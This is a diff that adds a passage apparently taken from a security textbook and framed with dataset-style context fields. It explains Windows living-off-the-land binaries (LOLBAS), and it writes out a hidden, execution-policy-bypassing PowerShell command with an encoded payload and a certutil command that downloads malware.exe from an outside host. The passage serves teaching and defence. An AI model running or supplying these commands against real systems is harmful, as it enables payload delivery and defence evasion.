@@ -1,0 +1,23 @@
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+libraries that can be abused by attackers to perform malicious activities on
+Windows systems. The concept is similar to GTFOBins for UNIX-based
+systems but focuses on Windows. LOLBAS can be accessed at
+https://lolbas-project.github.io.
+You already learned that PowerShell can be used to execute malicious
+scripts, download and execute payloads, and interact with the system
+without needing additional binaries. For example:
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonIn
+-NoProfile -WindowStyle Hidden -EncodedCommand
+<base64-encoded-command>
+CertUtil is command-line utility in Windows for managing certificates. It
+can be used to download files from the Internet, which can include
+malicious payloads:
+certutil.exe -urlcache -split -f https://h4cker.org/m
+malware.exe
+Mshta is a utility that executes Microsoft HTML Applications (HTA). It can
+be used to execute scripts embedded in HTML files, often used to download
+and execute malicious payloads.
